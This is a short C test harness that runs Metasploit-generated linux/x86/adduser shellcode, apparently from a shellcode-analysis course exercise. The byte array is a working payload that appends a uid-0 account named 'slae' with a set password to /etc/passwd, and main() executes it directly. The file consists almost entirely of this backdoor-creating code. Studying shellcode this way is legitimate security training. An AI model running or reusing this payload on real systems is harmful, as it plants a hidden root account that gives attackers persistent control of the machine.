#include<stdio.h>
#include<string.h>
/*
 * linux/x86/adduser - 93 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, USER=slae, PASS=isAwesome, SHELL=/bin/bash
 */
unsigned char code[] = \
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x24\x00\x00\x00\x73\x6c"
"\x61\x65\x3a\x41\x7a\x6a\x38\x5a\x6a\x47\x72\x6e\x73\x5a\x69"
"\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62"
"\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01"
"\x58\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	